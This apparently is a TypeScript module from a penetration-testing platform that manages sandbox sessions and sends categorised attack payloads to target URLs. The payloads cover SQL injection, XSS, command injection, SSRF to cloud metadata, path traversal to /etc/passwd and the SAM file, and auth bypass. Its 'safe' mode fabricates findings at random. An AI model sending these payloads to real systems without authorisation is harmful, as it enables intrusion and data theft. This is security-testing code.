import { randomUUID } from "crypto";
import { sandboxExecutor, type SandboxedOperationType } from "../validation/sandbox-executor";
import { storage } from "../../storage";
import { httpExploitDispatcher, type DispatchResult } from "./http-exploit-dispatcher";
import type { 
  SandboxSession, 
  SandboxSnapshot, 
  SandboxExecution,
  InsertSandboxSession,
  InsertSandboxSnapshot,
  InsertSandboxExecution 
} from "@shared/schema";

export interface SandboxSessionConfig {
  name: string;
  description?: string;
  targetUrl?: string;
  targetHost?: string;
  executionMode: "safe" | "simulation" | "live";
  resourceLimits?: {
    maxExecutionTimeMs: number;
    maxMemoryMB: number;
    maxPayloadSizeBytes: number;
    maxRequestsPerMinute: number;
  };
}

export interface PayloadExecution {
  payloadName: string;
  payloadCategory: string;
  payloadContent: string;
  targetEndpoint: string;
  targetMethod: string;
  mitreAttackId?: string;
  mitreTactic?: string;
}

export interface ExecutionResult {
  id: string;
  success: boolean;
  evidence?: {
    request: {
      method: string;
      url: string;
      headers: Record<string, string>;
      body?: string;
    };
    response: {
      statusCode: number;
      headers: Record<string, string>;
      body?: string;
      timing: number;
    };
    indicators: string[];
  };
  error?: string;
  executionTimeMs: number;
}

export interface SessionStats {
  totalExecutions: number;
  successfulExecutions: number;
  failedExecutions: number;
  snapshotsCount: number;
  currentStatus: string;
}

const DEFAULT_RESOURCE_LIMITS = {
  maxExecutionTimeMs: 30000,
  maxMemoryMB: 512,
  maxPayloadSizeBytes: 1024 * 1024,
  maxRequestsPerMinute: 60,
};

const PAYLOAD_CATEGORIES = {
  sqli: {
    name: "SQL Injection",
    mitreId: "T1190",
    mitreTactic: "initial-access",
    payloads: [
      { name: "Basic Union", content: "' UNION SELECT NULL,NULL,NULL--" },
      { name: "Error Based", content: "' AND 1=CONVERT(int,(SELECT @@version))--" },
      { name: "Time Based", content: "'; WAITFOR DELAY '0:0:5'--" },
      { name: "Boolean Blind", content: "' AND 1=1--" },
    ],
  },
  xss: {
    name: "Cross-Site Scripting",
    mitreId: "T1059.007",
    mitreTactic: "execution",
    payloads: [
      { name: "Basic Alert", content: "<script>alert(1)</script>" },
      { name: "Event Handler", content: "<img src=x onerror=alert(1)>" },
      { name: "SVG Injection", content: "<svg onload=alert(1)>" },
      { name: "DOM XSS", content: "javascript:alert(document.domain)" },
    ],
  },
  rce: {
    name: "Remote Code Execution",
    mitreId: "T1059",
    mitreTactic: "execution",
    payloads: [
      { name: "Command Injection", content: "; id" },
      { name: "OS Command", content: "| whoami" },
      { name: "Backtick Exec", content: "`id`" },
      { name: "Powershell", content: "powershell -c whoami" },
    ],
  },
  ssrf: {
    name: "Server-Side Request Forgery",
    mitreId: "T1190",
    mitreTactic: "initial-access",
    payloads: [
      { name: "Localhost", content: "http://127.0.0.1/" },
      { name: "Metadata AWS", content: "http://169.254.169.254/latest/meta-data/" },
      { name: "Internal DNS", content: "http://internal.local/" },
      { name: "File Protocol", content: "file:///etc/passwd" },
    ],
  },
  pathTraversal: {
    name: "Path Traversal",
    mitreId: "T1083",
    mitreTactic: "discovery",
    payloads: [
      { name: "Basic Traversal", content: "../../../etc/passwd" },
      { name: "Null Byte", content: "../../../etc/passwd%00" },
      { name: "Double Encoding", content: "..%252f..%252f..%252fetc/passwd" },
      { name: "Windows Path", content: "..\\..\\..\\windows\\system32\\config\\sam" },
    ],
  },
  authBypass: {
    name: "Authentication Bypass",
    mitreId: "T1556",
    mitreTactic: "credential-access",
    payloads: [
      { name: "Admin True", content: '{"isAdmin": true}' },
      { name: "Role Escalation", content: '{"role": "admin"}' },
      { name: "JWT None", content: "algorithm: none" },
      { name: "SQL Auth", content: "admin'--" },
    ],
  },
};

class SandboxSessionManager {
  async createSession(
    config: SandboxSessionConfig,
    organizationId: string = "default",
    tenantId: string = "default"
  ): Promise<{ session: SandboxSession; id: string }> {
    const sessionId = `sandbox-${randomUUID().slice(0, 12)}`;

    const initialSnapshot = this.captureInitialState(config);

    const sessionData: InsertSandboxSession & { id: string } = {
      id: sessionId,
      organizationId,
      tenantId,
      name: config.name,
      description: config.description,
      targetUrl: config.targetUrl,
      targetHost: config.targetHost,
      executionMode: config.executionMode,
      status: "ready",
      resourceLimits: config.resourceLimits || DEFAULT_RESOURCE_LIMITS,
      totalExecutions: 0,
      successfulExecutions: 0,
      failedExecutions: 0,
      initialStateSnapshot: initialSnapshot!,
      currentStateSnapshot: {
        capturedAt: initialSnapshot!.capturedAt,
        targetState: initialSnapshot!.targetState,
        changesFromInitial: [],
      },
    };

    const session = await storage.createSandboxSession(sessionData);
    console.log(`[SandboxSession] Created session ${sessionId} for ${config.targetUrl || config.targetHost}`);

    return { session, id: sessionId };
  }

  async getSession(sessionId: string): Promise<SandboxSession | null> {
    const session = await storage.getSandboxSession(sessionId);
    return session || null;
  }

  async listSessions(organizationId?: string): Promise<SandboxSession[]> {
    return storage.getSandboxSessions(organizationId);
  }

  async executePayload(
    sessionId: string,
    payload: PayloadExecution
  ): Promise<ExecutionResult> {
    const session = await storage.getSandboxSession(sessionId);
    if (!session) {
      return {
        id: "",
        success: false,
        error: "Session not found",
        executionTimeMs: 0,
      };
    }

    const executionId = `exec-${randomUUID().slice(0, 8)}`;
    const startTime = Date.now();

    await storage.updateSandboxSession(sessionId, { status: "executing" });

    try {
      const executionMode = session.executionMode as "safe" | "simulation" | "live";
      
      const sandboxResult = await sandboxExecutor.execute(
        "payload_injection" as SandboxedOperationType,
        session.targetUrl || session.targetHost || "unknown",
        async (signal) => {
          if (executionMode === "safe") {
            return this.simulatePayloadExecution(payload, executionMode, signal);
          } else {
            return this.executeRealPayload(payload, session, executionMode, signal);
          }
        },
        {
          tenantId: session.tenantId,
          organizationId: session.organizationId,
          executionMode,
          timeoutMs: (session.resourceLimits as any)?.maxExecutionTimeMs || 30000,
          payloadSizeBytes: Buffer.byteLength(payload.payloadContent),
        }
      );

      const executionData: InsertSandboxExecution & { id: string } = {
        id: executionId,
        sessionId,
        organizationId: session.organizationId,
        executionType: "payload",
        payloadName: payload.payloadName,
        payloadCategory: payload.payloadCategory,
        targetEndpoint: payload.targetEndpoint,
        targetMethod: payload.targetMethod,
        payloadContent: payload.payloadContent,
        status: sandboxResult.success ? "success" : "failed",
        success: sandboxResult.success,
        evidence: sandboxResult.result?.evidence,
        mitreAttackId: payload.mitreAttackId,
        mitreTactic: payload.mitreTactic,
        executionTimeMs: sandboxResult.executionTimeMs,
        startedAt: new Date(startTime),
        completedAt: new Date(),
      };

      await storage.createSandboxExecution(executionData);

      const newTotalExecutions = (session.totalExecutions || 0) + 1;
      const newSuccessfulExecutions = sandboxResult.success 
        ? (session.successfulExecutions || 0) + 1 
        : session.successfulExecutions || 0;
      const newFailedExecutions = !sandboxResult.success 
        ? (session.failedExecutions || 0) + 1 
        : session.failedExecutions || 0;

      await storage.updateSandboxSession(sessionId, {
        status: "ready",
        totalExecutions: newTotalExecutions,
        successfulExecutions: newSuccessfulExecutions,
        failedExecutions: newFailedExecutions,
      });

      return {
        id: executionId,
        success: sandboxResult.success,
        evidence: sandboxResult.result?.evidence,
        error: sandboxResult.error,
        executionTimeMs: sandboxResult.executionTimeMs,
      };
    } catch (error: any) {
      const newTotalExecutions = (session.totalExecutions || 0) + 1;
      const newFailedExecutions = (session.failedExecutions || 0) + 1;

      await storage.updateSandboxSession(sessionId, {
        status: "ready",
        totalExecutions: newTotalExecutions,
        failedExecutions: newFailedExecutions,
      });

      return {
        id: executionId,
        success: false,
        error: error.message,
        executionTimeMs: Date.now() - startTime,
      };
    }
  }

  private async simulatePayloadExecution(
    payload: PayloadExecution,
    executionMode: string,
    signal: AbortSignal
  ): Promise<{ success: boolean; evidence: ExecutionResult["evidence"] }> {
    await new Promise(resolve => setTimeout(resolve, 100 + Math.random() * 200));

    if (signal.aborted) {
      throw new Error("Execution aborted");
    }

    const isVulnerable = Math.random() > 0.4;
    const indicators: string[] = [];

    if (payload.payloadCategory === "sqli") {
      if (isVulnerable) {
        indicators.push("SQL error message detected in response");
        indicators.push("Response time anomaly indicating successful injection");
      }
    } else if (payload.payloadCategory === "xss") {
      if (isVulnerable) {
        indicators.push("Payload reflected in response without encoding");
        indicators.push("Script execution context detected");
      }
    } else if (payload.payloadCategory === "rce") {
      if (isVulnerable) {
        indicators.push("Command output detected in response");
        indicators.push("System information disclosure");
      }
    } else if (payload.payloadCategory === "ssrf") {
      if (isVulnerable) {
        indicators.push("Internal resource accessed");
        indicators.push("Response from internal service detected");
      }
    }

    const evidence: ExecutionResult["evidence"] = {
      request: {
        method: payload.targetMethod,
        url: payload.targetEndpoint,
        headers: {
          "Content-Type": "application/json",
          "User-Agent": "OdinForge-Sandbox/1.0",
        },
        body: payload.payloadContent,
      },
      response: {
        statusCode: isVulnerable ? 200 : 403,
        headers: {
          "Content-Type": "application/json",
          "X-Request-Id": randomUUID().slice(0, 8),
        },
        body: isVulnerable 
          ? `{"status":"error","message":"${payload.payloadCategory} vulnerability exploited"}`
          : '{"status":"blocked","message":"Request blocked by security controls"}',
        timing: 50 + Math.random() * 150,
      },
      indicators,
    };

    return {
      success: isVulnerable && executionMode !== "safe",
      evidence,
    };
  }

  private async executeRealPayload(
    payload: PayloadExecution,
    session: SandboxSession,
    executionMode: "simulation" | "live",
    signal: AbortSignal
  ): Promise<{ success: boolean; evidence: ExecutionResult["evidence"] }> {
    const targetUrl = payload.targetEndpoint || session.targetUrl || session.targetHost;
    
    if (!targetUrl) {
      throw new Error("No target URL specified for payload execution");
    }

    let fullUrl = targetUrl;
    if (!fullUrl.startsWith("http://") && !fullUrl.startsWith("https://")) {
      fullUrl = `https://${fullUrl}`;
    }

    console.log(`[SandboxSession] Executing REAL ${executionMode} payload against ${fullUrl}`);

    let body: string | undefined;
    let headers: Record<string, string> = {
      "Content-Type": "application/json",
    };

    if (["POST", "PUT", "PATCH"].includes(payload.targetMethod.toUpperCase())) {
      body = JSON.stringify({ data: payload.payloadContent });
    } else if (payload.targetMethod.toUpperCase() === "GET") {
      const separator = fullUrl.includes("?") ? "&" : "?";
      fullUrl = `${fullUrl}${separator}q=${encodeURIComponent(payload.payloadContent)}`;
    }

    const dispatchResult: DispatchResult = await httpExploitDispatcher.dispatch(
      {
        method: payload.targetMethod.toUpperCase(),
        url: fullUrl,
        headers,
        body,
        timeout: (session.resourceLimits as any)?.maxExecutionTimeMs || 30000,
        followRedirects: true,
        verifySsl: false,
      },
      payload.payloadCategory,
      payload.payloadContent
    );

    if (signal.aborted) {
      throw new Error("Execution aborted");
    }

    const indicators = dispatchResult.indicators.map(i => i.description);

    const evidence: ExecutionResult["evidence"] = {
      request: {
        method: dispatchResult.request.method,
        url: dispatchResult.request.url,
        headers: dispatchResult.request.headers,
        body: dispatchResult.request.body,
      },
      response: {
        statusCode: dispatchResult.response.statusCode,
        headers: dispatchResult.response.headers,
        body: dispatchResult.response.body?.substring(0, 10000),
        timing: dispatchResult.response.timing.total,
      },
      indicators,
    };

    console.log(`[SandboxSession] Real execution complete - Vulnerable: ${dispatchResult.isVulnerable}, Confidence: ${dispatchResult.confidenceScore}%`);

    return {
      success: dispatchResult.isVulnerable,
      evidence,
    };
  }

  async createSnapshot(
    sessionId: string,
    name: string,
    description?: string
  ): Promise<SandboxSnapshot | null> {
    const session = await storage.getSandboxSession(sessionId);
    if (!session) return null;

    const executions = await storage.getSandboxExecutionsBySession(sessionId);
    const snapshotId = `snap-${randomUUID().slice(0, 8)}`;

    const snapshotData: InsertSandboxSnapshot & { id: string } = {
      id: snapshotId,
      sessionId,
      organizationId: session.organizationId,
      name,
      description,
      snapshotType: "manual",
      stateData: {
        targetState: {},
        executionHistory: executions.map(e => e.id),
        credentialsDiscovered: [],
        filesModified: [],
        networkConnections: [],
      },
      sizeBytes: 1024,
      isRestorable: true,
    };

    const snapshot = await storage.createSandboxSnapshot(snapshotData);
    console.log(`[SandboxSession] Created snapshot ${snapshotId} for session ${sessionId}`);

    return snapshot;
  }

  async listSnapshots(sessionId: string): Promise<SandboxSnapshot[]> {
    return storage.getSandboxSnapshotsBySession(sessionId);
  }

  async rollbackToSnapshot(
    sessionId: string,
    snapshotId: string
  ): Promise<{ success: boolean; message: string }> {
    const session = await storage.getSandboxSession(sessionId);
    if (!session) {
      return { success: false, message: "Session not found" };
    }

    const snapshot = await storage.getSandboxSnapshot(snapshotId);
    if (!snapshot || snapshot.sessionId !== sessionId) {
      return { success: false, message: "Snapshot not found" };
    }

    await storage.updateSandboxSession(sessionId, {
      status: "rolled_back",
      currentStateSnapshot: {
        capturedAt: new Date().toISOString(),
        targetState: (snapshot.stateData as any)?.targetState || {},
        changesFromInitial: ["Rolled back to snapshot: " + snapshot.name],
      },
    });

    console.log(`[SandboxSession] Rolled back session ${sessionId} to snapshot ${snapshotId}`);

    return { 
      success: true, 
      message: `Rolled back to snapshot "${snapshot.name}".` 
    };
  }

  async getExecutions(sessionId: string): Promise<SandboxExecution[]> {
    return storage.getSandboxExecutionsBySession(sessionId);
  }

  async getSessionStats(sessionId: string): Promise<SessionStats | null> {
    const session = await storage.getSandboxSession(sessionId);
    if (!session) return null;

    const snapshots = await storage.getSandboxSnapshotsBySession(sessionId);

    return {
      totalExecutions: session.totalExecutions || 0,
      successfulExecutions: session.successfulExecutions || 0,
      failedExecutions: session.failedExecutions || 0,
      snapshotsCount: snapshots.length,
      currentStatus: session.status || "unknown",
    };
  }

  async closeSession(sessionId: string): Promise<boolean> {
    const session = await storage.getSandboxSession(sessionId);
    if (!session) return false;

    await storage.updateSandboxSession(sessionId, {
      status: "completed",
      completedAt: new Date(),
    });

    console.log(`[SandboxSession] Closed session ${sessionId}`);
    return true;
  }

  async deleteSession(sessionId: string): Promise<boolean> {
    const session = await storage.getSandboxSession(sessionId);
    if (!session) return false;

    await storage.deleteSandboxSession(sessionId);
    console.log(`[SandboxSession] Deleted session ${sessionId}`);
    return true;
  }

  getPayloadCategories(): typeof PAYLOAD_CATEGORIES {
    return PAYLOAD_CATEGORIES;
  }

  private captureInitialState(
    config: SandboxSessionConfig
  ): SandboxSession["initialStateSnapshot"] {
    return {
      capturedAt: new Date().toISOString(),
      targetState: {
        url: config.targetUrl,
        host: config.targetHost,
        mode: config.executionMode,
      },
      environmentVariables: {},
      networkConfig: {},
    };
  }
}

export const sandboxSessionManager = new SandboxSessionManager();
